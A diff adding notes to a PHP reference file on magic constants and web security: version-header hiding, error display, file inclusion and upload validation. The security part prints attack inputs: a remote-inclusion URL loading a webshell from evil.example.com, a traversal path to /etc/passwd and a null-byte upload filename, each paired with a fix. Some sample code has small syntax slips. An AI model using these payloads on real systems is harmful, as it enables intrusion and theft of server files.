@@ -5518,9 +5518,9 @@ You may start a session manually with session_start, or you can
 configure PHP to automatically start sessions with the
 session.auto_start directive in php.ini.
 
- #+begin_src php
- session_start() !== false or die('could not start session');
- #+end_src
+#+begin_src php
+session_start() !== false or die('could not start session');
+#+end_src
 
 ** session variables example
    
@@ -5915,6 +5915,112 @@ echo "Did nothing in $time seconds\n";
 Autoloading is when we tell PHP where to look for our class files when it needs
 a class declaration that it’s yet to see.
 
+* magic constants
+** File & Directory Constants
+*** Current file
+
+You can get the name of the current PHP file (with the absolute path) using the
+__FILE__ magic constant. This is most often used as a logging/debugging
+technique.
+#+begin_src php 
+echo "We are in the file:" , __FILE__ , "\n";
+#+end_src 
+
+*** Current directory
+
+To get the absolute path to the directory where the current file is located use the __DIR__ magic constant.
+#+begin_src php 
+echo "Our script is located in the:" , __DIR__ , "\n";
+#+end_src 
+
+To get the absolute path to the directory where the current file is located, use dirname(__FILE__).
+
+#+begin_src php 
+echo "Our script is located in the:" , dirname(__FILE__) , "\n";
+#+end_src 
+
+Getting current directory is often used by PHP frameworks to set a base directory:
+#+begin_src php 
+// index.php of the framework
+define(BASEDIR, __DIR__); // using magic constant to define normal constant
+// somefile.php looks for views:
+
+$view = 'page';
+$viewFile = BASEDIR . '/views/' . $view;
+#+end_src 
+
+*** Separators
+
+Windows system perfectly understands the / in paths so the DIRECTORY_SEPARATOR is used mainly when parsing paths.
+Besides magic constants PHP also adds some fixed constants for working with paths:
+
+ - ~DIRECTORY_SEPARATOR~ constant for separating directories in a path. Takes
+   value / on *nix, and \ on Windows. The example with views can be rewritten with:
+#+begin_src php 
+$view = 'page';
+$viewFile = BASEDIR . DIRECTORY_SEPARATOR .'views' . DIRECTORY_SEPARATOR . $view;
+#+end_src 
+
+ - Rarely used ~PATH_SEPARATOR~ constant for separating paths in the $PATH
+   environment variable. It is ; on Windows, : otherwise
+
+** Difference between __FUNCTION__ and __METHOD__
+__FUNCTION__ returns only the name of the function whereas __METHOD__ returns
+the name of the class along with the name of the function:
+#+begin_src php
+<?php
+
+class trick
+{
+    public function doit()
+    {
+        echo __FUNCTION__;
+    }
+
+    public function doitagain()
+    {
+        echo __METHOD__;
+    }
+}
+
+$obj = new trick();
+$obj->doit(); // Outputs: doit
+$obj->doitagain();  // Outputs: trick::doitagain
+#+end_src 
+
+** Difference between __CLASS__, get_class() and get_called_class()
+~__CLASS__~ magic constant returns the same result as get_class() function called
+without parameters and they both return the name of the class where it was
+defined (i.e. where you wrote the function call/constant name ).
+
+In contrast, get_class($this) and get_called_class() functions call, will both
+return the name of the actual class which was instantiated:
+
+#+begin_src php
+<?php
+
+class Definition_Class {
+
+  public function say(){
+     echo '__CLASS__ value: ' . __CLASS__ . "\n";
+     echo 'get_called_class() value: ' . get_called_class() . "\n";
+     echo 'get_class($this) value: ' . get_class($this) . "\n";
+     echo 'get_class() value: ' . get_class() . "\n";
+  }
+  
+}
+
+class Actual_Class extends Definition_Class {}
+
+$c = new Actual_Class();
+$c->say();
+// Output:
+// __CLASS__ value: Definition_Class
+// get_called_class() value: Actual_Class
+// get_class($this) value: Actual_Class
+// get_class() value: Definition_Class
+#+end_src 
+
 * security
 ** Cross-site scripting
 *** intro   
@@ -6039,6 +6145,259 @@ if ($_POST['token'] != $_SESSION['token'] ||
 
 ?>
 #+end_src
+
+** PHP version lookup
+By default, PHP will tell the world what version of PHP you are using, e.g.
+#+begin_src 
+X-Powered-By: PHP/5.3.8
+#+end_src 
+
+To fix this you can either change ~php.ini~:
+#+begin_src 
+expose_php = off
+#+end_src 
+
+Or change the header:
+#+begin_src php 
+header("X-Powered-By: Magic");
+#+end_src 
+
+Or if you'd prefer a htaccess method:
+#+begin_src 
+Header unset X-Powered-By
+#+end_src 
+
+If either of the above methods do not work, there is also the header_remove()
+function that provides you the ability to remove the header;
+#+begin_src php 
+header_remove('X-Powered-By');
+#+end_src 
+
+If attackers know that you are using PHP and the version of PHP that you are
+using, it's easier for them to exploit your server.
+
+** disabling error reporting
+It is good practice to avoid displaying potential error messages which will
+reveal information about your system, like for example your directory tree.
+Solution
+Turn them off before making your website visible to the outside world.
+#+begin_src 
+ini_set("display_errors", "0");
+#+end_src 
+Or change them directly in the php.ini.
+#+begin_src 
+display_errors = 0
+#+end_src 
+
+** Remote File Inclusion
+
+Remote File Inclusion (also known as RFI) is a type of vulnerability that allows
+an attacker to include a remote file.
+
+This example injects a remotely hosted file containing a malicious code:
+#+begin_src php 
+<?php
+include $_GET['page'];
+/vulnerable.php?page=http://evil.example.com/webshell.txt?
+#+end_src 
+
+*Local File Inclusion*
+
+Local File Inclusion (also known as LFI) is the process of including files on a
+server through the web browser.
+#+begin_src php 
+<?php
+$page = 'pages/'.$_GET['page'];
+if(isset($page)) {
+    include $page;
+} else {
+    include 'index.php';
+}
+/vulnerable.php?page=../../../../etc/passwd
+#+end_src 
+
+*Solution to RFI & LFI:*
+
+It is recommended to only allow including files you approved, and limit to those only.
+#+begin_src php 
+<?php
+$page = 'pages/'.$_GET['page'].'.php';
+$allowed = ['pages/home.php','pages/error.php'];
+if(in_array($page,$allowed)) {
+    include($page);
+} else {
+    include('index.php');
+}
+#+end_src 
+
+** Stripping Tags
+~strip_tags~ is a very powerful function if you know how to use it. However some
+people are oblivious of its full usage.
+
+*Basic Example*
+#+begin_src php 
+$string = '<b>Hello,<> please remove the <> tags.</b>';
+
+echo strip_tags($string);
+#+end_src 
+Raw Output
+#+begin_src 
+Hello, please remove the tags.
+Allowing Tags
+#+end_src 
+
+Say you wanted to allow a certain tag but no other tags, then you'd specify that
+in the second parameter of the function. This parameter is optional. In my case
+I only want the <b> tag to be passed through.
+#+begin_src php 
+$string = '<b>Hello,<> please remove the <br> tags.</b>';
+
+echo strip_tags($string, '<b>');
+#+end_src 
+
+*Raw Output* 
+#+begin_src 
+<b>Hello, please remove the  tags.</b>
+#+end_src 
+
+*Notice(s)*
+
+HTML comments and PHP tags are also stripped. This is hardcoded and can not be
+changed with allowable_tags.
+
+In PHP 5.3.4 and later, self-closing XHTML tags are ignored and only
+non-self-closing tags should be used in allowable_tags. For example, to allow
+both <br> and <br/>, you should use:
+#+begin_src php 
+<?php
+strip_tags($input, '<br>');
+?>
+#+end_src 
+
+** Uploading files
+If you want users to upload files to your server you need to do a couple of
+security checks before you actually move the uploaded file to your web
+directory.
+
+*The uploaded data:*
+
+This array contains user submitted data and is not information about the file
+itself. While usually this data is generated by the browser one can easily make
+a post request to the same form using software.
+#+begin_src 
+$_FILES['file']['name'];
+$_FILES['file']['type'];
+$_FILES['file']['size'];
+$_FILES['file']['tmp_name'];
+#+end_src 
+
+ - name - Verify every aspect of it.
+ - type - Never use this data. It can be fetched by using PHP functions instead.
+ - size - Safe to use.
+ - tmp_name - Safe to use.
+
+*Exploiting the file name*
+
+Normally the operating system does not allow specific characters in a file name,
+but by spoofing the request you can add them allowing for unexpected things to
+happen. For example, lets name the file:
+#+begin_src 
+../script.php%00.png
+#+end_src 
+Take good look at that filename and you should notice a couple of things.
+
+ 1 The first to notice is the ../, fully illegal in a file name and at the same
+ time perfectly fine if you are moving a file from 1 directory to another, which
+ we're gonna do right?
+
+ 2 Now you might thing you were verifying the file extensions properly in your
+script but this exploit rely's on the url decoding, translating %00 to a null
+character, basically saying to the operating system, this string ends here,
+stripping off .png off the filename. So now I've uploaded script.php to another
+directory, by-passing simple validations to file extensions. It also by-passes
+.htaccess files disallowing scripts to be executed from within your upload
+directory.
+
+Getting the file name and extension safely
+
+You can use pathinfo() to extrapolate the name and extension in a safe manner
+but first we need to replace unwanted characters in the file name:
+#+begin_src php
+// This array contains a list of characters not allowed in a filename
+$illegal   = array_merge(array_map('chr', range(0,31)), ["<", ">", ":", '"', "/", "\\", "|", "?", "*", " "]);
+$filename  = str_replace($illegal, "-", $_FILES['file']['name']);
+
+$pathinfo  = pathinfo($filename);
+$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
+$filename  = $pathinfo['filename'] ? $pathinfo['filename']:'';
+
+if(!empty($extension) && !empty($filename)){
+  echo $filename, $extension;
+} else {
+  die('file is missing an extension or name');
+}
+#+end_src 
+
+While now we have a filename and extension that can be used for storing, I still
+prefer storing that information in a database and give that file a generated
+name of for example, md5(uniqid().microtime())
+#+begin_src 
++----+--------+-----------+------------+------+----------------------------------+---------------------+
+| id | title  | extension | mime       | size | filename                         | time                |
++----+--------+-----------+------------+------+----------------------------------+---------------------+
+| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |
++----+--------+-----------+------------+------+----------------------------------+---------------------+
+#+end_src 
+
+This would resolve the issue of duplicate file names and unforseen exploits in
+the file name. It would also cause the attacker to guess where that file has
+been stored as he or she cannot specifically target it for execution.
+
+*Mime-type validation*
+
+Checking a file extension to determine what file it is is not enough as a file
+may named image.png but may very well contain a php script. By checking the
+mime-type of the uploaded file against a file extension you can verify if the
+file contains what its name is referring to.
+
+You can even go 1 step further for validating images, and that is actually opening them:
+#+begin_src php 
+if($mime == 'image/jpeg' && $extension == 'jpeg' || $extension == 'jpg'){
+  if($img = imagecreatefromjpeg($filename)){
+    imagedestroy($img);
+  } else {
+    die('image failed to open, could be corrupt or the file contains something else.');
+  }
+}
+#+end_src 
+
+You can fetch the mime-type using a build-in function or a class.
+
+*White listing your uploads*
+
+Most importantly, you should whitelist file extensions and mime types depending on each form.
+#+begin_src php 
+$whitelist = [
+  'extensions' => [
+    'png', 'gif', 'jpg', 'jpeg'
+  ],
+  'mimes' => [
+    'image/png',
+    'image/gif',
+    'image/jpeg',
+  ]
+];
+
+if(in_array($extension, $whitelist['extensions'])){
+  if(in_array(mime_content_type($filename), $whitelist['mimes']){
+    // safe to store.
+  } else {
+    die('file extension does not match mime');
+  }
+} else {
+  die("Only '" . join(', ', $whitelist['extensions'])) . "' extensions are allowed");
+}
+#+end_src 
 
 * apache =.htaccess= sample configuration
   
@@ -7055,3 +7414,6 @@ http://psoug.org/browse.htm?cid=2
 ** other
 
 https://github.com/ziadoz/awesome-php
+
+https://stackoverflow.com/documentation/php/topics
+
